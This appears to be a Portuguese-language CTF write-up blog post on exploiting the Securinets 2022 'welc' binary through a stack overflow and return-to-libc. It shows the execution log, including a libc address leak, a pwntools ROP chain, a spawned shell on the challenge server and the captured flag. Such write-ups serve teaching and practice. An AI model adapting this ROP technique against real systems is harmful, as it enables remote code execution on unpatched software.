---
layout: post
title: Welcome - [Securinets CTF Quals 2022] - Return to libc com pwntools
date: 2022-04-11 20:53
author: obrerodrigues
comments: true
categories: [CTFs]
tags: [Sem Categoria, stack overflow, return-to-libc, rop, exploits]
---
**Link para o challenge: https://github.com/brerodrigues/exploit_drafts/tree/main/ctfing/Securinets_CTF_Quals_2022/1_welc**

Um clássico stack overflow. O binário não tem **stack canaries** nem **PIE**, mas está com **NX** ligado, então nada de shellcode. Por ter vindo uma libc junto do challenge, um ataque **return-to-libc** é facilitado e possível mesmo que o servidor esteja com **ASLR** habilitado. Sabendo o que tenho e o que posso fazer foi só questão de pôr em prática:

* Primeiro obtenho um leak do endereço de puts na libc. Consigo fazer isso com facilidade porque sem PIE no binário posso utilizar todos os endereços do mesmo. Depois de obter o endereço de puts, reinicio o binário finalizando minha primeira rop chain com o endereço de \_start. 
* Com o leak, basta usar um pouco de matemática para calcular on-demand o endereço de qualquer função da libc e montar uma segunda rop chain para executar **system('/bin/sh')**, obter a shell e ler a flag.

Esse resumo pode ter parecido grego para o não iniciado, então para os novinhos recomendo o liveoverflow explicando que porra é ret2libc: https://www.youtube.com/watch?v=m17mV24TgwY

A execução e o código do exploit completo podem ser observados abaixo. Destaco a facilidade que é utilizar a pwntools para criar rop chains (e vários outros processos repetitivos manuais necessários para escrever um exploit, vale a pena aprender e dominar essa porra) e demonstro no código essa diferença. Tentei comentar o que achei interessante para complementar a postagem.

Executando:
```
b@vbm ~/c/s/pwn1> python3 xpl.py
[+] Opening connection to 20.216.39.14 on port 1237: Done
[*] '/home/b/ctf/securinets/pwn1/welc'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './welc'
Zied likes degla b zbib ! what about you ?
[*] '/home/b/ctf/securinets/pwn1/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
Leaked puts 0x7f4b74d56450
System address 0x7f4b74d242c0
/bin/sh address 0x7f4b74e865bd
0x0000:         0x40101a ret
0x0008:         0x401283 pop rdi; ret
0x0010:              0x0 [arg0] rdi = 0
0x0018:         0x401281 pop rsi; pop r15; ret
0x0020:              0x0 [arg1] rsi = 0
0x0028:      b'kaaalaaa' <pad r15>
0x0030:   0x7f4b74de6980
0x0038:         0x401283 pop rdi; ret
0x0040:   0x7f4b74e865bd [arg0] rdi = 139962060662205
0x0048:   0x7f4b74d242c0
Press enter to pwn...
Zied likes degla b zbib ! what about you ?
Enjoy the shell
[*] Switching to interactive mode
$ ls
flag.txt
welc
ynetd
$ cat flag.txt
Securinets{5d91d2e01b854fd457c1d8b592a19b38af6b4a33c6362b7d}
```

E o exploit:
<script src="https://gist.github.com/brerodrigues/9161ae24483d0e2f78aef8e6318088b1.js"></script>
